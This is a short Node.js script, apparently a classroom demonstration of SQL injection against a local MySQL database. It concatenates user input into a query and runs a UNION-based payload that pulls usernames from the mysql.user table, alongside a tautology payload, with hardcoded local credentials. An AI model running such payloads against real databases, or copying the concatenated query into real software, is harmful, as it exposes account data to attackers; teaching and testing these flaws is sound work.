import mysql from 'mysql2/promise'

let connection

try {
  connection = await mysql.createConnection({
    host: 'localhost',
    database: 'ismv3',
    user: 'app1',
    password: 'ism'
  })
  
  let naiveQuery = 'select last_name from students1 where email='

  let regularInput = 'j@somwhere.com'
  let hostileInput1 = "' or 1 = 1;#"
  let hostileInput2 = "' or 1 = 1 union select user from mysql.user;#"

  let [rows, _] = await connection.query(naiveQuery + "'" + hostileInput2 + "'")

  console.log(rows)

} catch (error) {
  console.warn(error)
} finally {
  if (connection) {
    await connection.destroy()
  }
}